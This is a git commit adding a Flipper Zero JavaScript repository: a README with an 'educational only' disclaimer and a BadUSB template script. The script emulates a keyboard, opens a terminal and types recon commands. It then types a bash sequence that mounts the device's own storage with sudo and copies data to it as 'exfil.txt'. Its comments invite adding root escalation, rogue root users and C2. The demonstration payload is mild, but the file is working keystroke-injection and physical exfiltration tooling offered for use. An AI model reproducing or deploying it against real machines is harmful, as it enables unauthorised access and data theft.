fb0861c8dd51e9ec913dbd303d0bbbaaf480a36c
Nick Shaw <nick.shaw@jetblk.net>
2024-04-10 00:27:07 -0400

    Initial Commit

---
+++ README.md
@@ -0,0 +1,44 @@
+<div align=center>
+
+# FlipperZero JavaScript Apps
+
+</div>
+
+**DISCLAIMER**: This repository is for educational purposes only and is not intended for real-world usage. I am not responsible for any harm or damage that may occur as a result of using the information or code provided in this repository. By accessing and using this repository, you acknowledge and agree that you do so at your own risk!
+
+***  
+
+# Table of Contents
+
+[Description](#Description)
+
+[Scripts](#Scripts)
+
+[Contact](#Contact)
+
+***  
+
+## Description
+🧪 These scripts have been tested with [Momentum Firmware](https://momentum-fw.dev/).
+
+📍 Recommended location for these scripts are on your SD card under `/apps/Scripts`
+
+⚠️ GL, HF and please use responsibly.
+
+<p align="right">(<a href="#top">back to top</a>)</p>
+
+## Scripts
+
+
+| Payloads                                                                                                        | Description                                                                                       | Plug'n'Play | Author      |
+| :-------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------ | :-----------| :-----------|
+| [_TEMPLATE](TBD)                | This script is to act as boilerplate for a BadUSB + USB Mass Storage app setup.      |⛔️           | JetBlk      |
+
+<p align="right">(<a href="#top">back to top</a>)</p>
+
+## Contact
+
+[Discord](https://discord.gg/ZbNN6Xm8Gg) |
+[Twitter](https://twitter.com/jetblk)
+
+<p align="right">(<a href="#top">back to top</a>)</p>
---
+++ Scripts/_TEMPLATE.js
@@ -0,0 +1,135 @@
+//
+//     __     ______     ______   ______     __         __  __    
+//    /\ \   /\  ___\   /\__  _\ /\  == \   /\ \       /\ \/ /    
+//   _\_\ \  \ \  __\   \/_/\ \/ \ \  __<   \ \ \____  \ \  _"-.  
+//  /\_____\  \ \_____\    \ \_\  \ \_____\  \ \_____\  \ \_\ \_\ 
+//  \/_____/   \/_____/     \/_/   \/_____/   \/_____/   \/_/\/_/ 
+// 
+//                                                             
+// JavaScript App Template
+// Version 1.0
+// 
+// This script is to act as boilerplate for a BadUSB + USB Mass Storage app setup.
+// Execution example would be handled in multiple phases: primary and secondary.
+// Primary phase will execute some commands, secondary phase will be used for exfiltrating data.
+//
+// Example - Environment: Linux
+// - Primary Phase: Elevate privledges to root (utilizing any method)
+// - Secondary Phase: Now that you have root access, Exfil data to USB Mass storage
+// - Further phases can be added for creating a new root user, establishing c2, etc
+//
+// Author: JetBlk (https://github.com/jetblk || https://discord.com/users/415611606408364062/)
+//
+
+let badusb = require("badusb");
+let usbdisk = require("usbdisk");
+let storage = require("storage");
+let dialog = require("dialog");
+
+// ************
+// IMPORTANT: Be sure this matches your computer keyboard layout!!!
+// See /ext/badusb/assets/layouts/ for list of supported keyboard layouts.
+let layout = "en-US";
+
+// ************
+// Executes BadUSB commands with the ability to print to the F0 screen as the script executes, then have an optional delay.
+function sendToConsole(script)
+{
+    // script.message, script.command, script.delay
+    for (let i = 0; i < script.length; i++) {
+        if(script[i].message) print(script[i].message); // F0 screen message
+        badusb.println(script[i].command); // BadUSB command to execute
+        if(script[i].delay) delay(script[i].delay); // Delay
+    }
+}
+
+// ************
+// Storage definition for data exfil
+let imageName = "PHUN";
+let image = "/ext/apps_data/mass_storage/" + imageName + ".img";
+let size = 8 * 1024 * 1024;
+
+// ************
+// Primary Script Definition
+let primary = [
+    { message: "Executing: id", command: "id", delay: 5000 },
+    { message: "Executing: uname -a", command: "uname -a", delay: 1000 },
+];
+
+// ************
+// Secondary Script Definition (Exfil)
+let secondary = [
+    { command: "bash -c '", delay: 10 },
+    { command: "img=" + imageName + ";", delay: 10 },
+    { command: "disk=/dev/disk/by-id/usb-Flipper_Mass_Storage_$img-0:0;", delay: 10 },
+    { command: "part=$disk-part1;", delay: 10 },
+    { command: "while [ ! -b $part ];do sleep 1;done;", delay: 10 },
+    { command: "mnt=$(mktemp -d);", delay: 10 },
+    { command: "date=$(date +%Y-%m-%d);", delay: 10 },  // Current Date in YYYY-MM-DD format - see below
+    { command: "time=$(date +%s);", delay: 10 },        // Current timestamp - Use the combination of $date and $time to create unique folders/files
+    { command: "sudo mount $part $mnt;", delay: 10 },
+    { command: "id > $mnt/exfil.txt", delay: 10 },  // exfil whatever you want
+    { command: "sync $mnt/exfil.txt;", delay: 10 },
+    { command: "sudo umount $part", delay: 10 },
+    { command: "sudo eject $disk;", delay: 10 },
+    { command: "rm -rf $mnt", delay: 10 },
+    { command: "'&disown;exit", delay: 10 },
+];
+
+// ************
+// Get storage ready
+print("Checking for Image...");
+if (storage.exists(image)) {
+    print ("Storage Exists.");
+}
+else {
+	print ("Creating Storage...");
+	usbdisk.createImage(image, size);
+}
+
+// ************
+// Setup BadUSB connection
+badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });
+print("Waiting for connection");
+while (!badusb.isConnected()) {
+    delay(1000);
+}
+
+// ************
+// Show a dialog to pause execution until ready
+dialog.message("USB is connected. Bombs away?", "Press OK to start");
+
+// ************
+// Open Terminal
+badusb.press("CTRL", "ALT", "t");
+delay(500);
+
+// ************
+// Execute Primary Script
+print("Phase 1 executing...");
+sendToConsole(primary);
+print("Phase 1 complete.");
+delay(500);
+
+// ************
+// Execute Secondary Script (Exfil)
+print("Phase 2 executing...");
+sendToConsole(secondary);
+print("Phase 2 complete.");
+delay(500);
+
+// ************
+// Detach Keyboard
+badusb.quit();
+
+// ************
+// Wait for typing to finish and attach storage, eject and finish
+delay(2000);
+usbdisk.start(image);
+print("Please wait until the terminal closes to eject.");
+
+while (!usbdisk.wasEjected()) {
+    delay(1000);
+}
+usbdisk.stop();
+print("Script Complete.");
